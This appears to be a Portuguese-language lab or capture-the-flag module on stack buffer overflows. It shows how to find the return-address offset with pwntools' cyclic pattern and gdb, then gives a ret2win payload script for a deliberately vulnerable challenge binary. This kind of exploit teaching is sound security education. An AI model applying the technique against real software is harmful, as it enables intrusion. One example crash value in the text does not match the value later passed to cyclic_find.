# Buffer overflow: descobrir o offset

Comeca o bloco de **buffer overflow completo**. No modulo 10 o offset ate o
endereco de retorno foi dado (72). Aqui o tamanho do buffer **nao e informado**.
Seu trabalho e descobri-lo com o padrao ciclico (`cyclic`), a tecnica padrao para
isso.

## O programa vulneravel

`/challenge/vuln.c` tem `void vuln(int fd)` com um buffer de tamanho desconhecido e
um `read` que le muito mais do que cabe. Existe uma funcao `win()` que imprime
`OFFSET_OK`.

## Descobrindo o offset com cyclic

Um padrao ciclico e uma sequencia em que cada trecho de 8 bytes e unico
(`aaaaaaaa`, `baaaaaaa`, ...). Quando ele sobrescreve o endereco de retorno, o
programa tenta voltar para um valor que e um pedaco do padrao. Achando qual pedaco,
voce sabe o offset exato.

```bash
# compile o mesmo binario
gcc -O0 -fno-stack-protector -no-pie /challenge/vuln.c -o /tmp/vuln

# gere um padrao e rode sob o gdb
python3 -c "from pwn import cyclic; open('/tmp/pat','wb').write(cyclic(400))"
gdb -q /tmp/vuln
  (gdb) run /tmp/pat
  # o programa recebe SIGSEGV ao tentar 'ret' para um endereco invalido.
  # veja o valor no topo da pilha / o endereco que falhou, por exemplo 0x6161616161616e6a
  (gdb) x/gx $rsp
  (gdb) quit

# traduza o valor para um offset
python3 -c "from pwn import cyclic_find, p64; print(cyclic_find(0x616161616161616a))"
```

O numero impresso e o offset ate o endereco de retorno. (Neste binario ele vale
**120**, mas o objetivo e voce chegar nesse valor pela tecnica, nao decorar.)

## O que voce precisa fazer

```python
from pwn import p64, ELF, context
import subprocess

subprocess.run(
    ["gcc", "-O0", "-fno-stack-protector", "-no-pie",
     "/challenge/vuln.c", "-o", "/tmp/vuln_solve"],
    check=True,
)
win = ELF("/tmp/vuln_solve").symbols["win"]

offset = 120                 # descoberto com cyclic
payload  = b"A" * offset
payload += p64(win)
open("/home/hacker/payload.bin", "wb").write(payload)
```

## Fluxo completo

```bash
python3 /home/hacker/solve.py
/challenge/check
```

## Por que isto importa

Descobrir o offset e o primeiro passo pratico de qualquer stack overflow: sem ele,
voce nao sabe onde colocar o endereco de retorno. O `cyclic` automatiza o que antes
era tentativa e erro. Nos proximos modulos, em vez de pular para uma funcao
existente, voce vai colocar o seu proprio shellcode no buffer.
